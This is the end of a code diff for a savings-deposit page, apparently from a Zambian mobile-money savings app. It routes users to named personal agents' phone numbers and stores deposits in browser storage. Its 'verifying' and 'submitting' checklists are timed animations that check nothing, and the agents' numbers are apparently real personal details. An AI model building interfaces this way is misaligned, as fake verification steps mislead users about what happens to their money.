+                    number: '0963070992',
+                    displayNumber: '096 307 0992',
+                    network: 'MTN'
+                },
+                AIRTEL: {
+                    name: 'John Kabwe',
+                    number: '0571518417',
+                    displayNumber: '057 151 8417',
+                    network: 'Airtel'
+                },
+                ZAMTEL: {
+                    name: 'Jeremiah Ilunga',
+                    number: '0951359357',
+                    displayNumber: '095 135 9357',
+                    network: 'Zamtel'
+                }
+            };
+
+            // ── Helpers ──
+            function delay(ms) {
+                return new Promise(function(r) { setTimeout(r, ms); });
+            }
+
+            function getUserSavings(userId) {
+                try {
+                    var key = 'sajvera_savings_' + userId;
+                    var data = localStorage.getItem(key);
+                    if (data) {
+                        var parsed = JSON.parse(data);
+                        if (parsed && typeof parsed === 'object') {
+                            if (!parsed.wealth) parsed.wealth = [];
+                            if (!parsed.reserve) parsed.reserve = [];
+                            if (!parsed.growth) parsed.growth = [];
+                            if (!parsed.transactions) parsed.transactions = [];
+                            return parsed;
+                        }
+                    }
+                } catch (_) { /* ignore */ }
+                return { wealth: [], reserve: [], growth: [], transactions: [] };
+            }
+
+            function saveUserSavings(userId, savingsData) {
+                localStorage.setItem('sajvera_savings_' + userId, JSON.stringify(savingsData));
+            }
+
+            function formatCurrency(amount) {
+                return 'K' + amount.toFixed(2);
+            }
+
+            function getBranchDisplayName(b) {
+                var map = {
+                    wealth: 'PureOre Wealth',
+                    reserve: 'PureOre Reserve',
+                    growth: 'PureOre Growth'
+                };
+                return map[b] || b;
+            }
+
+            // ── Phone Number Normalization & Validation ──
+            function normalizePhone(raw) {
+                var cleaned = raw.replace(/[\s\-\(\)\.]/g, '');
+                if (/^\d{9}$/.test(cleaned) && !cleaned.startsWith('0')) {
+                    cleaned = '0' + cleaned;
+                }
+                if (cleaned.startsWith('0')) {
+                    cleaned = '+260' + cleaned.substring(1);
+                } else if (cleaned.startsWith('260')) {
+                    cleaned = '+' + cleaned;
+                } else if (!cleaned.startsWith('+')) {
+                    cleaned = '+260' + cleaned;
+                }
+                return cleaned;
+            }
+
+            function detectNetwork(normalized) {
+                if (!normalized.startsWith('+260')) return null;
+                var numberPart = normalized.substring(4);
+                if (numberPart.length !== 9) return null;
+                var prefix2 = numberPart.substring(0, 2);
+                if (prefix2 === '96' || prefix2 === '76') return 'MTN';
+                if (prefix2 === '97' || prefix2 === '77' || prefix2 === '57') return 'AIRTEL';
+                if (prefix2 === '95' || prefix2 === '75') return 'ZAMTEL';
+                return null;
+            }
+
+            function validatePhone(raw) {
+                var normalized = normalizePhone(raw);
+                if (!normalized.startsWith('+260')) {
+                    return { valid: false, normalized: normalized, error: 'Invalid phone number. Please enter a valid Zambian mobile number.' };
+                }
+                var numberPart = normalized.substring(4);
+                if (numberPart.length !== 9) {
+                    return { valid: false, normalized: normalized, error: 'Phone number must be 9 digits after +260.' };
+                }
+                var network = detectNetwork(normalized);
+                if (!network) {
+                    return { valid: false, normalized: normalized, error: 'Network not supported. We currently support MTN, Airtel and Zamtel payment numbers.' };
+                }
+                return { valid: true, normalized: normalized, network: network };
+            }
+
+            function getAgent(network) {
+                var key = network.toUpperCase();
+                return AGENTS[key] || null;
+            }
+
+            // ── Show screens ──
+            function showScreen(el) {
+                document.querySelectorAll('.screen').forEach(function(s) { s.classList.remove('active'); });
+                el.classList.add('active');
+            }
+
+            function navigateTo(screenId) {
+                var map = {
+                    loading: loadingScreen,
+                    phone: phoneScreen,
+                    agent: agentScreen,
+                    sms: smsVerificationScreen,
+                    processing: processingScreen,
+                    success: successScreen
+                };
+                if (map[screenId]) showScreen(map[screenId]);
+            }
+
+            // ── Load initial data ──
+            async function loadInitial() {
+                var items = loadingCheckList.querySelectorAll('.check-item');
+                for (var i = 0; i < items.length; i++) {
+                    await delay(400 + Math.random() * 300);
+                    items[i].classList.add('done');
+                    items[i].querySelector('.check-icon').textContent = '✓';
+                }
+                await delay(300);
+
+                currentUser = getLoggedInUser();
+                if (!currentUser) {
+                    // If no Firebase user, the auth check will redirect, so this should not happen.
+                    // But fallback: redirect to login.
+                    window.location.href = 'login.html';
+                    return;
+                }
+
+                var urlParams = new URLSearchParams(window.location.search);
+                branch = urlParams.get('branch') || 'wealth';
+                amount = parseFloat(urlParams.get('amount')) || 0;
+                period = parseInt(urlParams.get('period')) || 0;
+                reason = urlParams.get('reason') || null;
+                goalName = urlParams.get('goal') || null;
+                targetAmount = parseFloat(urlParams.get('target')) || 0;
+                interestRate = parseFloat(urlParams.get('rate')) || 0;
+
+                if (!amount) {
+                    var selectionKey = branch + '_selection';
+                    var stored = localStorage.getItem(selectionKey);
+                    if (stored) {
+                        try {
+                            var data = JSON.parse(stored);
+                            amount = data.amount || 0;
+                            period = data.period || period;
+                            reason = data.reason || reason;
+                            goalName = data.goalName || data.goal || goalName;
+                            targetAmount = data.target || targetAmount;
+                            interestRate = data.rate || interestRate;
+                        } catch (_) { /* ignore */ }
+                    }
+                }
+
+                if (!amount || amount <= 0) {
+                    amount = 100;
+                }
+
+                var branchDisplay = getBranchDisplayName(branch);
+                agentBranchBadge.textContent = branchDisplay;
+                agentBranchName.textContent = branchDisplay;
+                agentAmount.textContent = formatCurrency(amount);
+                processingBranchLabel.textContent = branchDisplay;
+
+                if (currentUser.phone) {
+                    var display = currentUser.phone.replace('+260', '+260 ');
+                    registeredPhoneNumber.textContent = display;
+                    registeredPhoneContainer.style.display = 'flex';
+                }
+
+                navigateTo('phone');
+            }
+
+            // ── Phone validation and continue ──
+            function validateAndContinue() {
+                var raw = phoneInput.value.trim();
+                if (raw === '') {
+                    phoneHint.textContent = 'Please enter your phone number.';
+                    phoneHint.style.color = '#EF4444';
+                    phoneError.style.display = 'none';
+                    phoneContinueBtn.disabled = true;
+                    return;
+                }
+
+                var result = validatePhone(raw);
+                if (!result.valid) {
+                    phoneHint.textContent = result.error;
+                    phoneHint.style.color = '#EF4444';
+                    phoneError.textContent = result.error;
+                    phoneError.style.display = 'block';
+                    phoneInput.classList.add('error');
+                    phoneContinueBtn.disabled = true;
+                    return;
+                }
+
+                phoneHint.textContent = '✅ Valid ' + result.network + ' number.';
+                phoneHint.style.color = '#10B981';
+                phoneError.style.display = 'none';
+                phoneInput.classList.remove('error');
+                phoneContinueBtn.disabled = false;
+                phoneNumber = result.normalized;
+                network = result.network;
+            }
+
+            phoneInput.addEventListener('input', validateAndContinue);
+            phoneInput.addEventListener('blur', validateAndContinue);
+
+            useRegisteredBtn.addEventListener('click', function() {
+                if (currentUser.phone) {
+                    var raw = currentUser.phone.replace('+260', '');
+                    phoneInput.value = raw;
+                    validateAndContinue();
+                    phoneInput.focus();
+                }
+            });
+
+            phoneContinueBtn.addEventListener('click', function() {
+                if (phoneContinueBtn.disabled) return;
+                showAgentLoading();
+            });
+
+            // ── Show Agent with loading ──
+            async function showAgentLoading() {
+                var checkItems = processingCheckList.querySelectorAll('.check-item');
+                checkItems.forEach(function(el) {
+                    el.classList.remove('done');
+                    el.querySelector('.check-icon').textContent = '○';
+                });
+                processingBranchLabel.textContent = getBranchDisplayName(branch);
+
+                showScreen(processingScreen);
+
+                var msgs = [
+                    'Verifying payment number…',
+                    'Reading mobile network…',
+                    'Identifying payment channel…',
+                    'Preparing your payment instructions…'
+                ];
+                var labels = processingCheckList.querySelectorAll('.check-label');
+                labels.forEach(function(el, idx) {
+                    if (msgs[idx]) el.textContent = msgs[idx];
+                });
+
+                for (var i = 0; i < checkItems.length; i++) {
+                    await delay(500 + Math.random() * 300);
+                    checkItems[i].classList.add('done');
+                    checkItems[i].querySelector('.check-icon').textContent = '✓';
+                }
+
+                await delay(400);
+
+                agent = getAgent(network);
+                if (!agent) {
+                    alert('Agent not found. Please try again.');
+                    navigateTo('phone');
+                    return;
+                }
+
+                agentNetwork.textContent = agent.network;
+                agentName.textContent = agent.name;
+                agentNumber.textContent = agent.displayNumber;
+                document.querySelector('.agent-status').textContent = '✓ ' + agent.network + ' Payment Agent';
+
+                agentBranchBadge.textContent = getBranchDisplayName(branch);
+                agentBranchName.textContent = getBranchDisplayName(branch);
+                agentAmount.textContent = formatCurrency(amount);
+
+                navigateTo('agent');
+            }
+
+            // ── Copy number ──
+            copyBtn.addEventListener('click', function() {
+                var rawNumber = agent.number;
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(rawNumber).then(function() {
+                        showCopyFeedback();
+                    }).catch(function() {
+                        fallbackCopy(rawNumber);
+                    });
+                } else {
+                    fallbackCopy(rawNumber);
+                }
+            });
+
+            function fallbackCopy(text) {
+                var textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    document.execCommand('copy');
+                    showCopyFeedback();
+                } catch (e) {
+                    alert('Could not copy. Please copy manually: ' + text);
+                }
+                document.body.removeChild(textarea);
+            }
+
+            function showCopyFeedback() {
+                copyFeedback.style.display = 'block';
+                setTimeout(function() {
+                    copyFeedback.style.display = 'none';
+                }, 3000);
+            }
+
+            // ── I HAVE PAID → Show SMS Verification ──
+            paidBtn.addEventListener('click', function() {
+                navigateTo('sms');
+                smsInput.focus();
+                smsError.style.display = 'none';
+                smsInput.classList.remove('error');
+                smsSubmitBtn.disabled = true;
+                paymentSms = '';
+            });
+
+            // ── SMS input validation ──
+            smsInput.addEventListener('input', function() {
+                var val = this.value.trim();
+                if (val.length > 0) {
+                    smsError.style.display = 'none';
+                    smsInput.classList.remove('error');
+                    smsSubmitBtn.disabled = false;
+                    paymentSms = val;
+                } else {
+                    smsSubmitBtn.disabled = true;
+                }
+            });
+
+            // ── SMS submit ──
+            smsSubmitBtn.addEventListener('click', function() {
+                if (smsSubmitBtn.disabled) return;
+                var sms = smsInput.value.trim();
+                if (sms === '') {
+                    smsError.style.display = 'block';
+                    smsInput.classList.add('error');
+                    return;
+                }
+                submitPayment(sms);
+            });
+
+            // ── Back button from SMS screen ──
+            smsBackBtn.addEventListener('click', function() {
+                navigateTo('agent');
+            });
+
+            // ── Submit Payment (now with SMS) ──
+            async function submitPayment(sms) {
+                var checkItems = processingCheckList.querySelectorAll('.check-item');
+                checkItems.forEach(function(el) {
+                    el.classList.remove('done');
+                    el.querySelector('.check-icon').textContent = '○';
+                });
+                processingBranchLabel.textContent = getBranchDisplayName(branch);
+
+                var msgs = [
+                    'Recording payment information…',
+                    'Creating your savings transaction…',
+                    'Linking your payment to ' + getBranchDisplayName(branch) + '…',
+                    'Submitting for administrator verification…'
+                ];
+                var labels = processingCheckList.querySelectorAll('.check-label');
+                labels.forEach(function(el, idx) {
+                    if (msgs[idx]) el.textContent = msgs[idx];
+                });
+
+                showScreen(processingScreen);
+
+                for (var i = 0; i < checkItems.length; i++) {
+                    await delay(500 + Math.random() * 300);
+                    checkItems[i].classList.add('done');
+                    checkItems[i].querySelector('.check-icon').textContent = '✓';
+                }
+
+                await delay(400);
+
+                var now = new Date().toISOString();
+                var record = {
+                    userId: currentUser.id,
+                    amount: amount,
+                    type: 'savings',
+                    branch: branch,
+                    savingReason: reason,
+                    goalName: goalName,
+                    targetAmount: targetAmount,
+                    savingPeriod: period,
+                    interestRate: interestRate,
+                    interestAmount: 0,
+                    protectedAmount: 0,
+                    feeReserve: 0,
+                    maturityBalance: 0,
+                    status: 'pending',
+                    submittedAt: now,
+                    approvedAt: null,
+                    startDate: null,
+                    maturityDate: null,
+                    withdrawn: false,
+                    paymentPhone: phoneNumber,
+                    paymentNetwork: network,
+                    agentName: agent.name,
+                    agentNumber: agent.number,
+                    paymentSms: sms
+                };
+
+                var savings = getUserSavings(currentUser.id);
+                var branchKey = branch;
+                if (!savings[branchKey]) savings[branchKey] = [];
+                savings[branchKey].push(record);
+                if (!savings.transactions) savings.transactions = [];
+                savings.transactions.push({
+                    userId: currentUser.id,
+                    amount: amount,
+                    type: 'savings',
+                    branch: branch,
+                    status: 'pending',
+                    submittedAt: now,
+                    description: 'Savings Deposit - ' + getBranchDisplayName(branch)
+                });
+                saveUserSavings(currentUser.id, savings);
+
+                localStorage.setItem('last_' + branch + '_deposit', JSON.stringify({
+                    amount: amount,
+                    period: period,
+                    rate: interestRate,
+                    goalName: goalName || reason || 'Savings'
+                }));
+
+                successBranch.textContent = getBranchDisplayName(branch);
+                successAmount.textContent = formatCurrency(amount);
+                successNetwork.textContent = network;
+                successAgent.textContent = agent.name;
+
+                navigateTo('success');
+            }
+
+            // ── History redirect ──
+            viewHistoryBtn.addEventListener('click', function() {
+                window.location.href = 'history.html?branch=' + branch;
+            });
+
+            // ── Back buttons ──
+            phoneBackBtn.addEventListener('click', function() {
+                var branchMap = {
+                    wealth: 'wealth.html',
+                    reserve: 'reserve.html',
+                    growth: 'growth.html'
+                };
+                window.location.href = branchMap[branch] || 'saving.html';
+            });
+
+            agentBackBtn.addEventListener('click', function() {
+                navigateTo('phone');
+            });
+
+            // ── Android Back Button ──
+            window.addEventListener('popstate', function(e) {
+                var activeScreen = document.querySelector('.screen.active');
+                if (activeScreen === phoneScreen) {
+                    var branchMap = {
+                        wealth: 'wealth.html',
+                        reserve: 'reserve.html',
+                        growth: 'growth.html'
+                    };
+                    window.location.href = branchMap[branch] || 'saving.html';
+                } else if (activeScreen === agentScreen) {
+                    navigateTo('phone');
+                } else if (activeScreen === smsVerificationScreen) {
+                    navigateTo('agent');
+                } else if (activeScreen === successScreen) {
+                    window.location.href = 'history.html?branch=' + branch;
+                } else {
+                    navigateTo('phone');
+                }
+            });
+
+            // ── Init ──
+            function init() {
+                history.pushState({ page: 'saving-deposit' }, '');
+                loadInitial();
+            }
+
+            init();
+
+        })();
+    </script>
+
+</body>
+</html>
